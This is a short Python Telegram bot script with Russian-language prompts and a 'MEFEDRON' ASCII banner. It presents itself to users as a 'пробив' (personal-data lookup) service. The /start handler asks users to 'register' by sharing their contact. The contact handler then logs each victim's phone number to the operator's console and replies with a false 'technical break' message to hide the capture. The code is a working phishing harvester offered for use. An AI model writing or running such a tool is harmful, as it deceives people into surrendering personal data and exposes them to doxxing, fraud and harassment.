import os
import time
import telebot
from telebot import types
import threading

COLOR_CODE = {
    "RESET": "\033[0m",
    "UNDERLINE": "\033[04m",
    "RED": "\033[31m",
    "YELLOW": "\033[93m",
    "GREEN": "\033[32m",
    "CYAN": "\033[36m",
    "BOLD": "\033[01m",
    "PINK": "\033[95m",
    "URL_L": "\033[36m",
    "LI_G": "\033[92m",
    "F_CL": "\033[0m",
    "DARK": "\033[90m",
}
os.system("cls")
print(f'''{COLOR_CODE["GREEN"]}
 ███▄ ▄███▓▓█████   █████▒▓█████ ▓█████▄  ██▀███   ▒█████   ███▄    █ 
▓██▒▀█▀ ██▒▓█   ▀ ▓██   ▒ ▓█   ▀ ▒██▀ ██▌▓██ ▒ ██▒▒██▒  ██▒ ██ ▀█   █ 
▓██    ▓██░▒███   ▒████ ░ ▒███   ░██   █▌▓██ ░▄█ ▒▒██░  ██▒▓██  ▀█ ██▒
▒██    ▒██ ▒▓█  ▄ ░▓█▒  ░ ▒▓█  ▄ ░▓█▄   ▌▒██▀▀█▄  ▒██   ██░▓██▒  ▐▌██▒
▒██▒   ░██▒░▒████▒░▒█░    ░▒████▒░▒████▓ ░██▓ ▒██▒░ ████▓▒░▒██░   ▓██░
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░    ░░ ▒░ ░ ▒▒▓  ▒ ░ ▒▓ ░▒▓░░ ▒░▒░▒░ ░ ▒░   ▒ ▒ 
░  ░      ░ ░ ░  ░ ░       ░ ░  ░ ░ ▒  ▒   ░▒ ░ ▒░  ░ ▒ ▒░ ░ ░░   ░ ▒░
░      ░      ░    ░ ░       ░    ░ ░  ░   ░░   ░ ░ ░ ░ ▒     ░   ░ ░ 
       ░      ░  ░           ░  ░   ░       ░         ░ ░           ░ 
                                  ░   ''')

bot_token = input(f'{COLOR_CODE["RED"]}Введите токен вашего бота ( для выхода нажмите 9 ):{COLOR_CODE["RESET"]}')

if bot_token == "9":
    print(f'{COLOR_CODE["RED"]}выход...{COLOR_CODE["RESET"]}')
else:
    bot = telebot.TeleBot(bot_token)

    def listen_for_input():
        while True:
            command = input()
            if command == "9":
                print(f"{COLOR_CODE['RED']}выход...{COLOR_CODE['RESET']}")
                bot.stop_polling()
                break

    input_thread = threading.Thread(target=listen_for_input)
    input_thread.daemon = True
    input_thread.start()

    @bot.message_handler(commands=['start'])
    def start(message):
        keyboard = types.ReplyKeyboardMarkup(row_width=1, resize_keyboard=True)
        button_phone = types.KeyboardButton(text="Регистрация", request_contact=True)
        keyboard.add(button_phone)
        os.system('cls' if os.name == 'nt' else 'clear')
        os.system('color 0A')
        print(f"{COLOR_CODE['RED']}\n\n\n")
        print(f"{COLOR_CODE['RED']}Добро пожаловать в бот по пробиву! Нажмите кнопку ниже, чтобы зарегистрироваться.{COLOR_CODE['RESET']}")
        bot.send_message(message.chat.id, "Добро пожаловать в бот по пробиву! Нажмите кнопку ниже, чтобы зарегистрироваться.", reply_markup=keyboard)

    @bot.message_handler(content_types=['contact'])
    def contact(message):
        if message.contact is not None:
            phone_number = message.contact.phone_number
            print(f"{COLOR_CODE['RED']}Получен номер телефона: {phone_number}{COLOR_CODE['RESET']}")
            bot.send_message(message.chat.id, "Бот на техническом перерыве. Мы вас оповестим, когда он закончится!")

    bot.polling()